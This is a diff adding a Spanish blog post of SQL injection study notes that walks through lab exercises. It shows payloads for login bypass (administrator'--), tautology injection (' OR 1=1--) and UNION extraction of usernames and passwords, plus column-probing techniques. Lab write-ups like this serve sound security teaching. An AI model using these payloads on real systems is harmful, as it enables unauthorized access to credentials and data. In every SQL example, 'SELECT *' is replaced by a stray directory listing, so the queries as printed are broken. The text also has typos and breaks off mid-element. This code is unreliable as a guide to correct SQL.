@@ -1,0 +1,1644 @@
+<h2 id="0-índice">0. Índice.</h2>
+
+<ul>
+  <li>1 Concepto de SQLInjection.</li>
+  <li>2 Ejemplos de SQLInjection.
+    <ul>
+      <li>2.1. Extracción de datos ocultos.</li>
+      <li>2.2. Subversión de la lógica de la aplicación.</li>
+      <li>2.3. Extrayendo datos de otras tablas.
+        <ul>
+          <li>2.3.2. Apéndice búsquedas con UNION.</li>
+        </ul>
+      </li>
+      <li>2.4. Examinando la base de datos
+        <ul>
+          <li>2.4.2. Querys para determinar la version y el tipo.</li>
+          <li>2.4.3. Listando el contenido de una base de datos no perteneciente a Oracle.</li>
+          <li>2.4.4 Listando los contenidos de una base de datos perteneciente a Oracle.</li>
+        </ul>
+      </li>
+      <li>2.5. Cheat Sheet.</li>
+    </ul>
+  </li>
+  <li>3 Blind SQLi.
+    <ul>
+      <li>3.1. ¿Qué es una inyección de código ciega?</li>
+      <li>3.2. Explotando una vulnerabilidad SQL ciega provocando respuestas condicionales.</li>
+      <li>3.3. Obteniendo respuestas condicionales desencadenando errores SQL.</li>
+      <li>
+        <p>3.4. Explotando una vulnerabilidad SQL ciega provocando retrasos en las respuestas del servidor.</p>
+
+        <p><br /></p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="1-concepto-de-sql-injection">1. Concepto de SQL Injection.</h3>
+
+<p>El <strong>SQL Injection</strong> o SQLi es una vulnerabilidad web que permite a un atacante interferir con las búsquedas que una aplicación web hace a una base de datos. Generalmente permite a un atacante ver información sensible (contraseñas, tablas, etc) que en muchos casos también puede modificar o borrar causando un daño permanente a la aplicación.</p>
+
+<p>En algunas situaciones un atacante puede llegar a comprometer el servidor subyacente u otras infraestructuras back-end (aquellas que forman parte de la aplicación pero que se ejecutan en la parte del servidor).</p>
+
+<p>Generalmente, estas vulnerabilidades se corresponden con el valor que adopta algún parámetro de alguna query que se realiza en el servidor que contiene la base de datos.</p>
+
+<p><br /></p>
+
+<h3 id="2-ejemplos-de-sql-injection">2. Ejemplos de SQL Injection.</h3>
+
+<p>Para comprender correctamente los ejemplos que se van a presentar a continuación se necesita tener un conocimiento básico acerca de bases de datos y lenguaje SQL que puede obtenerse acudiendo al séptimo apartado del post <em>Ataques a aplicaciones web</em> de la página <em>Basics</em> del tema RedTeam.</p>
+
+<p><br /></p>
+
+<p>Existen una extensa variedad de tipos de vulnerabilidades de SQL Injection.</p>
+
+<p><br /></p>
+
+<h4 id="21-extracción-de-datos-ocultos">2.1. Extracción de datos ocultos.</h4>
+
+<p>Supongámos que tenemos una aplicación que muestra productos de diferentes categorías, entre ellas la categoría ‘Gift’. Cuando un usuario clicka sobre dicha categoría su buscador hace una petición HTTP-GET a dicha aplicación web con la URL:</p>
+
+<pre><code class="language-default">https://website.com/products?category=Gifts
+</code></pre>
+
+<p>Que resulta en una búsqueda en su base de datos a través de la siguiente sentencia SQL:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">category</span> <span class="o">=</span> <span class="s1">'Gifts'</span> <span class="k">AND</span> <span class="n">released</span> <span class="o">=</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<p>Debemos observar que el valor del parámetro ‘category’ de la URL anterior ha quedado incrustado entre dos comillas en esta sentencia SQL. Hemos de tener esto en mente en todo el desarrollo que sigue del ejemplo.</p>
+
+<p>La sentencia anterior consta de las siguientes partes:</p>
+
+<ul>
+  <li><strong>SELECT *</strong>: Selecciona todo.</li>
+  <li><strong>FROM products</strong> : de la tabla productos.</li>
+  <li><strong>WHERE category = ‘Gifts’ AND released = 1</strong>: Donde el campo category debe coincidir con Gifts y el campo released debe coincidir con 1.</li>
+</ul>
+
+<p>Es decir, que la sentencia anterior recoge todos los elementos de la tabla productos cuyo campo ‘category’ sea ‘Gift’ (excluyéndo cualquier cosa que no sea un regalo) y cuyo campo ‘released’ (Publicado) sea 1 (excluyéndo cualquier regalo no autorizado para publicarse en la tienda que tendrá dicho campo presumiblemente a 0).</p>
+
+<p>Sin embargo, por falta de saneamiento de código, este sitio web no está preparado frente a un ataque de SQL Injection pudiéndose presentar la siguiente situación:</p>
+
+<p>Un usuario modifica la request HTTP-GET alterando la URL que envía a la aplicación:</p>
+
+<pre><code class="language-default">https://web-site.com/products?category=Gifts'--
+</code></pre>
+
+<p>Desencadenando la siguiente ‘query’ SQL:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gitfs'</span> <span class="c1">--' AND released=1</span>
+</code></pre></div></div>
+
+<p>Así, recuperándo la mención que hacíamos anteriormente, el valor del parámetro ‘category’ de la URL; Gifts’–, ha sido incrustado entre comillas produciendo una inferencia en la búsqueda:</p>
+
+<ul>
+  <li><strong>Gifts</strong>: Determina el valor de ‘category’.</li>
+  <li><strong>‘</strong> : Cierra el valor del campo según las reglas sintácticas de SQL.</li>
+  <li><strong>–</strong>: Es un término que actúa a modo de iniciador de comentarios en SQL comentando y consecuentemente inválidando el resto de la query SQL.</li>
+</ul>
+
+<p>Así, esta alteración de la URL deriva efectivamente en:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gitfs'</span>
+</code></pre></div></div>
+
+<p>que mostrará toda la columna ‘Gifts’ independientemente de si están o no publicados.</p>
+
+<p>Esto puede ir más lejos con la URL:</p>
+
+<pre><code class="language-default">https://web-site.com/products?category='+OR+1=1--
+</code></pre>
+
+<p>que deriva en:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
+</code></pre></div></div>
+
+<p>El statement WHERE de SQL actúa como un analizador y revisa registro a registro el resto de atributos de los elementos de las columnas seleccionadas por SELECT (en este caso todas) para ver si se cumple con la condición impuesta que normalmente es que un determinado campo tenga un valor concreto (en el caso anterior; released=1).</p>
+
+<p>En este caso, nuestra condición contiene un componente tautológico; 1=1, haciendo que esta se cumpla para todos los elementos de SELECT provocando que estos se muestren por pantalla y desplegando así la información de toda la tabla.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: SQL Injection vulnerabiltity in WHERE clause allowing retrieval of hidden data</strong>.</p>
+
+<p>Nos encontramos ante una tienda ficticia en el que podemos elegir entre una serie de opciones para ver qué productos están disponibles:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306023934.png" text-align="center" />
+</div>
+
+<p>Al presionar sobre la opción Gifts se lleva a cabo una request que nos redirecciona a otra página tal y como se muestran en la URL:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306024025.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306024047.png" text-align="center" />
+</div>
+
+<p>De manera que, poniéndo en práctica lo aprendido, modificamos la URL convenientemente para obtener productos no publicados:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306024225.png" text-align="center" />
+</div>
+
+<p>Y al darle a Enter:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306024252.png" text-align="center" />
+</div>
+
+<p>podemos comprobar que ha aparecido un producto más. Ampliando la URL añadiendo un elemento tautológico obtenemos todos los productos de la tabla:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306024544.png" text-align="center" />
+</div>
+
+<p>A modo de observación, cuando se nos devuelve la página web con todos los productos podemos observar que la comilla ‘ se ha transformado en un %27:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306024619.png" text-align="center" />
+</div>
+
+<p>Esto sucede porque es la forma en la que se codifican ciertos caracteres en la URL, para más información: https://www.w3schools.com/tags/ref_urlencode.asp</p>
+
+<p><br /></p>
+
+<h4 id="22-subversión-de-la-lógica-de-la-aplicación">2.2. Subversión de la lógica de la aplicación.</h4>
+
+<p>Consideremos ahora un caso distinto. Una aplicación que permite a un usuario logearse con un usuario y una contraseña.</p>
+
+<p>Tal sistema de logeo funciona cotejando las credenciales introducidas con los datos existentes en una base de datos, si existen el logeo es satisfactorio y si no el acceso es denegado.</p>
+
+<p>De esta forma, una petición de logeo en esta página web se termina traduciendo una ‘query’ sql del tipo:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'USER'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'PASS'</span>
+</code></pre></div></div>
+
+<p>De nuevo, si la aplicación web no sanea el código que se introduce en los campos de logeo, un atacante podría logearse como el administrador a través de la siguiente query:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="c1">--' AND password=''</span>
+</code></pre></div></div>
+
+<p>Introduciendo en la web en el campo ‘username’ el término: administrator’–, y siguiendo la misma lógica que en los casos anteriores, se selecciona el nombre del usuario y se suprime el resto de código obteniéndo una query siempre positiva, dándo acceso a dicha cuenta.</p>
+
+<p>Vamos a verlo con un ejemplo práctico:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: SQL Injection vulnerability allowing login bypass</strong>.</p>
+
+<p>En este caso nos encontramos ante una página de logeo con las siguientes características en la que existe un apartado de logeo a la derecha; My Account:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306132605.png" text-align="center" />
+</div>
+
+<p>Pulsándo dicho ‘botón’ se nos redirige a otra página en el que debemos introducir nuestras credenciales en los respectivos campos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306134245.png" text-align="center" />
+</div>
+
+<p>Podemos observar un dato interesante, esta se trata de una HTTP-POST request, ya que los datos que se introducen son sensibles y por tanto no pueden expuestos como parámetros en la URL con lo que van en el interior de la request, esto puede comprobarse dándo a ‘Inspeccionar Elemento’ sobre la página y realizando una request que quedará registrada en la pestaña ‘Network’:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306134646.png" text-align="center" />
+</div>
+
+<p>Es un buen momento para utilizar el proxy de burpsuite y analizar la request que se envía.</p>
+
+<p>Así, para utilizar el proxy en primer lugar abrimos BurpSuite y acudimos la pestaña Proxy &gt; Options y lo configuramos para que escuche en el puerto local 8080</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306141643.png" text-align="center" />
+</div>
+
+<p>Seguidamente, configuramos nuestro buscador para que redirija las conexiones http/https entrantes hacia el puerto 8080, esto dependerá del buscador que escojamos, en este caso, utilizando Firefox desplegamos el menu de la derecha Preferencias &gt; Network Settings y añadimos la siguiente información:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306142548.png" text-align="center" />
+</div>
+
+<p>De esta manera, todas las conexiones que se emitan o que reciba nuestro ordenador pasarán por el puerto 8080, puerto en el que estará escuchando la aplicación BurpSuite que interceptará la petición saliente y nos la mostrará.</p>
+
+<p>De esta forma, en la web introduciendo unas credenciales genéricas y pulsando el botón Log in nos saltará la siguiente pestaña:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306142804.png" text-align="center" />
+</div>
+
+<p>Y aunque podríamos introducir esta información directamente en el campo de la web, vamos a realizar un ataque de inyección SQL dando el valor al parámetro username de ‘administrator’–’:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306143635.png" text-align="center" />
+</div>
+
+<p>Sólo queda liberar la petición seleccionando Intercept is off:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220306144121.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h4 id="23-extrayendo-datos-de-otras-tablas">2.3. Extrayendo datos de otras tablas.</h4>
+
+<p>En muchos casos también es posible exponer información sensible a otras tablas de la base de datos a través del operador UNION de SQL que permite enlazar varias SELECT query en una misma sentencia.</p>
+
+<p>Así, su consideramos el ejemplo del principio en el que tenemos la URL de la web con la que llevamos a cabo una petición:</p>
+
+<pre><code class="language-default">https://web-site.com/products?category=Gifts
+</code></pre>
+
+<p>Podemos ampliar el valor del parámetro category a:</p>
+
+<pre><code class="language-default">https://web-site.com/products?category=Gifts' UNION SELECT username, password FROM users --
+</code></pre>
+
+<p>Traduciéndose esto en la siguiente query SQL:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gifts'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span> <span class="c1">-- ' AND release=1</span>
+</code></pre></div></div>
+
+<p>Mostrándo así todas las credenciales de la base de datos.</p>
+
+<p><br /></p>
+
+<h4 id="232-apéndice-búsquedas-con-union">2.3.2. Apéndice búsquedas con UNION.</h4>
+
+<p><strong>Normas para enlazar dos SELECT</strong></p>
+
+<p>Concretamente para que una búsqueda con UNION sea efectiva se deben de cumplir dos requisitos.</p>
+
+<ul>
+  <li>
+    <p><strong>Ambas búsquedas SELECT deben devolver las mismas columnas</strong>, es decir, en el ejemplo anterior se está suponiendo que todos los elementos de la tabla productos están ordenados en dos columnas.</p>
+  </li>
+  <li>
+    <p><strong>Los tipos de datos de cada columna deben de ser compatibles entre las búsquedas individuales</strong>.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Determinando el número de columnas requeridas para enlazar dos SELECT con UNION</strong></p>
+
+<p>Recordando la primera regla anterior, vamos a ver dos métodos efectivos para averiguar el número de columnas, necesarias para enlazar dos búsquedas.</p>
+
+<ul>
+  <li><strong>El primero es utilizar el statement ORDER BY</strong>.</li>
+</ul>
+
+<p>Este estatement se utiliza para ordenar los resultados obtenidos en una búsqueda en función de una columna especificada.</p>
+
+<p>Estas columnas se pueden referenciar o bien por el nombre (column_name1, column_name2,…) o bien por la posición (1, 2, 3,…).</p>
+
+<p>Por ejemplo, tenemos una tabla que desplegamos con el statemente:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">Customers</span>
+</code></pre></div></div>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307162352.png" text-align="center" />
+</div>
+
+<p>Si introducimos el statement:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">Customers</span>
+<span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<p>La tabla se ordenará en función de la primera columna siguiendo un orden numérico y determinando el resto de los elementos de la tabla gracias al sistema de registros.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307162612.png" text-align="center" />
+</div>
+
+<p>Si introducimos el statement:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">Customers</span>
+<span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">2</span>
+</code></pre></div></div>
+
+<p>La tabla se ordenará en función de la segunda columna siguiendo la misma lógica que el apartado anterior.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307162612.png" text-align="center" />
+</div>
+
+<p>Sin embargo no hay cambios apreciables debido a que la segunda columna está también ordenada en orden alfabético por defecto.</p>
+
+<p>Sin embargo introduciendo:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">Customers</span>
+<span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">3</span>
+</code></pre></div></div>
+
+<p>La tabla se ordena en función de la tercera columna y ahí si hay cambios apreciables:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307163619.png" text-align="center" />
+</div>
+
+<p>De esta manera, en el momento en el que introduzcamos un cardinal superior al número de columnas que hay en la tabla saltará un error y eso lo podemos aprovechar para deducir cuándo nos hemos pasado del número de columnas que hay.</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>El segundo método es utilizando NULL</strong></li>
+</ul>
+
+<p>Es decir, podemos utilizar “el cuento de la vieja” y hacer pruebas introduciendo un statement con UNION e ir introduciendo NULLs hasta que el número de columnas en ambas querys coincida:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">...</span> <span class="k">FROM</span> <span class="n">users</span>
+</code></pre></div></div>
+
+<p>De esta forma lo que hacemos es ir añadiendo NULLs hasta que el número de columnas de la segunda búsqueda coincida con el número de columnas de la tabla ‘products’. Cuando eso ocurra se mostrará la primera y la segunda búsqueda.</p>
+
+<p>Cabe mencionar que en algunos casos este método de busqueda puede resultar inefectivo si la página no devuelve ningún valor aunque se haya introducido el número correcto de NULLs.</p>
+
+<p><strong>Notas del método NULL</strong></p>
+<ul>
+  <li>
+    <p>La razón por la que utilizamos NULL como el valor de retorno del SELECT injectado es debido a que NULL es un valor nulo configurado como un dato “genérico” que es transformable (y por tanto también compatible) a cualquier tipo de dato (2ªregla).</p>
+  </li>
+  <li>
+    <p>En algunos casos será necesario añadir un FROM statement para que la query sea sintácticamente válida, como por ejemplo en Oracle, de forma que para llevar a cabo este tipo de ataques en esa empresa deberíamos utilizar una tabla denominada DUAL que siempre está construida dentro de la infraestructura digital de Oracle.</p>
+  </li>
+  <li>
+    <p>Por último, en SQL se utiliza el doble guión para generar un comentario, pero cuando el SGBD (sistema gestor de base de datos) es MySQL se debe dejar un espacio al final del doble guión para que pueda ser interpretado como un comentario. Más información en: https://portswigger.net/web-security/sql-injection/cheat-sheet</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 3: SQL Injection UNION attack, determining the number of columns returned b the query</strong>.</p>
+
+<p>Vamos a intentar enlazar una segunda búsqueda en la aplicación web de products utilizando UNION, para ello vamos a emplear lo visto anteriormente para obtener el número de columnas adecuado.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307171855.png" text-align="center" />
+</div>
+
+<p>Seleccionamos ‘Gifts’ y se nos redirige a una página a través de un HTTP-GET tal y como se puede ver en los parámetros que acompañan a la URL:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307172424.png" text-align="center" />
+</div>
+
+<ol>
+  <li>Método ORDER BY:</li>
+</ol>
+
+<p>Vamos a introducir el statement ORDER BY con una serie de cardinales hasta obtener un error:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307172640.png" text-align="center" />
+</div>
+<p><br /></p>
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307172806.png" text-align="center" />
+</div>
+<p><br /></p>
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307172850.png" text-align="center" />
+</div>
+<p><br /></p>
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307172910.png" text-align="center" />
+</div>
+
+<p>Observemos que debemos introducir el statemente con la codificación correspondiente en la URL. Al llegar al cardinal 4 aparece un error de forma que sabemos que el número de columnas es 3.</p>
+
+<p><br /></p>
+
+<ol>
+  <li>Método NULL.</li>
+</ol>
+
+<p>Enlazamos una nueva SELECT query a través de UNION en la URL y aportamos un NULL por columna:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307174457.png" text-align="center" />
+</div>
+<p><br /></p>
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220307174759.png" text-align="center" />
+</div>
+<p><br /></p>
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220308074005.png" text-align="center" />
+</div>
+
+<p>De nuevo, volvemos a introducir los datos con la codificación pertinente.</p>
+
+<p><br /></p>
+
+<p>**Encontrando columnas con tipos de datos útiles en un ataque UNION de SQLInjection.md</p>
+
+<p>La razón por la que realizamos un ataque de SQL injection con UNION es para extraer datos de la tabla que referenciamos en la segunda query.</p>
+
+<p>Generalmente, estos datos serán de tipo “string” (cadena de caracteres) y por tanto lo más conveniente es encontrar tipos de datos en la primera query compatibles con los tipos de datos que quieres extraer.</p>
+
+<p>Habiendo determinado el número de columnas que requiere la segunda búsqueda para ser efectiva, podemos ahora testear cada columna para saber si pueden o no tener cadenas de caracteres como tipo de dato:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT '</span><span class="n">a</span><span class="s1">',NULL,NULL,NULL--
+</span></code></pre></div></div>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT NULL,'</span><span class="n">a</span><span class="s1">',NULL,NULL--
+</span></code></pre></div></div>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT NULL,NULL,'</span><span class="n">a</span><span class="s1">',NULL--
+</span></code></pre></div></div>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT NULL,NULL,NULL,'</span><span class="n">a</span><span class="s1">'--
+</span></code></pre></div></div>
+
+<p>De esta manera, si la columna testeada soporta String como tipo de dato se devolverá información y de lo contrario aparecerá algún tipo de error relacionado con la conversión de datos.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: SQL injection UNION attack, finding a column containing text</strong></p>
+
+<p>Este caso será una continuación del laboratorio 3, en el que se nos pedía averiguar el número de columnas necesarias a añadir para establecer una segunda búsqueda correctamente.</p>
+
+<p>Ahora, sabemos que dicho número es 3 vamos testear cada columna para el tipo de dato ‘string’. Vamos a intentar que la página nos devuelva la cadena ‘BO5CnB’.</p>
+
+<p>Para ello introducimos dicha cadena substituyendo por cada NULL en la columna correspondiente.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220308085332.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
